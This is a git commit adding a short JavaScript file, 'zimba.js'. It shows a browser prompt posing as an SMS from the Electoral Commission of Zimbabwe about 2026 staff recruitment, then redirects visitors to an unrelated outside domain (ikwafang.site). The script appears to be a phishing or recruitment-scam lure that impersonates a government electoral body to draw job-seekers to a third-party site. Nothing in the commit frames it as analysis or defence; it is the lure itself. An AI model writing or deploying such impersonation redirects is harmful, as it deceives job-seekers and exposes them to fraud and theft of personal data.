f599618748776f54b77a7872875164eca5c5bf99
usorondo26 <rent-willow2s@icloud.com>
2026-02-26 21:26:00 +0100

    Create zimba.js

---
+++ zimba.js
@@ -0,0 +1,8 @@
+var password = 'APPLY'
+password = prompt(
+  'SMS: Welcome to The Electoral Commission of Zimbabwe (ZEC) Staff Recruitment 2026. Please click OK to Proceed.',
+  'APPLY'
+);
+if (password != 'APPLY') {
+  location.href = 'https://www.ikwafang.site/zec-ad-hoc-staff-recruitment';
+}
